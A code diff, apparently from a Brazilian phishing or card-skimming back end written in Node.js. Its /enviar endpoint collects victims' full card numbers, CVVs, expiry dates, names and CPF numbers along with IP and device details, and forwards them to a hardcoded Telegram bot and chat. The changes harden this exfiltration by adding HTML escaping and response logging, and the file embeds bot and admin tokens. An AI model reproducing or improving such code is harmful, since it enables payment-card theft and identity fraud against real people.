@@ -23,7 +23,6 @@ const DATA_DIR = __dirname;
 const usersFile = path.join(DATA_DIR, 'users.txt');
 const checkoutFile = path.join(DATA_DIR, 'checkout.txt');
 
-// ENV variables com fallback
 const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8492628989:AAH28BrxrcyF0hdwLVSAFTvsA7OA80_OkGA";
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID || "-1002852733056";
 const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'MOUSEPADGAFANHOTO';
@@ -35,6 +34,14 @@ function ensureFilesExist() {
 }
 function nowISO() { return new Date().toISOString(); }
 
+// Escapa caracteres para envio seguro no Telegram
+function escapeHTML(str) {
+  if (!str) return '';
+  return str.replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;');
+}
+
 async function sendToTelegram(message) {
   if (!TELEGRAM_TOKEN || !CHAT_ID) {
     console.warn('⚠️ TELEGRAM env ausentes. Pulando envio.');
@@ -44,6 +51,7 @@ async function sendToTelegram(message) {
   const body = { chat_id: CHAT_ID, text: message, parse_mode: 'HTML', disable_web_page_preview: true };
   const resp = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
   const data = await resp.json().catch(() => ({}));
+  console.log('Telegram response:', data, 'HTTP status:', resp.status);
   if (!resp.ok || data.ok === false) {
     const desc = (data && data.description) ? data.description : `HTTP ${resp.status}`;
     throw new Error(`Erro do Telegram: ${desc}`);
@@ -105,9 +113,9 @@ app.post('/enviar', async (req, res) => {
       expiry,
       cardholderIdentificationNumber,
       cardholderNameC,
-      timeOnPage,   // novo
-      os,           // novo
-      connection    // novo
+      timeOnPage,
+      os,
+      connection
     } = req.body || {};
 
     if (!cardNumber || !cardcvvName || !expiry || !cardholderIdentificationNumber || !cardholderNameC) {
@@ -135,16 +143,16 @@ app.post('/enviar', async (req, res) => {
 
     const mensagem =
       `<b>Nova Info Recebida</b>\n` +
-      `💳 <b>Número:</b> ${cardNumber}\n` +
-      `🔒 <b>CVV:</b> ${cardcvvName}\n` +
-      `📅 <b>Validade:</b> ${expiry}\n` +
-      `👤 <b>Nome:</b> ${cardholderNameC}\n` +
-      `🆔 <b>CPF:</b> ${cardholderIdentificationNumber}\n` +
+      `💳 <b>Número:</b> ${escapeHTML(cardNumber)}\n` +
+      `🔒 <b>CVV:</b> ${escapeHTML(cardcvvName)}\n` +
+      `📅 <b>Validade:</b> ${escapeHTML(expiry)}\n` +
+      `👤 <b>Nome:</b> ${escapeHTML(cardholderNameC)}\n` +
+      `🆔 <b>CPF:</b> ${escapeHTML(cardholderIdentificationNumber)}\n` +
       `🕒 <b>TS:</b> ${payload.ts}\n` +
-      `🌐 <b>IP:</b> ${payload.ip}\n` +
-      `💻 <b>SO:</b> ${payload.os}\n` +
-      `📡 <b>Conexão:</b> ${payload.connection}\n` +
-      `⏱️ <b>Tempo na página:</b> ${payload.timeOnPage ? payload.timeOnPage + 'ms' : 'desconhecido'}`;
+      `🌐 <b>IP:</b> ${escapeHTML(payload.ip)}\n` +
+      `💻 <b>SO:</b> ${escapeHTML(payload.os)}\n` +
+      `📡 <b>Conexão:</b> ${escapeHTML(payload.connection)}\n` +
+      `⏱️ <b>Tempo na página:</b> ${escapeHTML(payload.timeOnPage ? payload.timeOnPage+'ms' : 'desconhecido')}`;
 
     try {
       await sendToTelegram(mensagem);
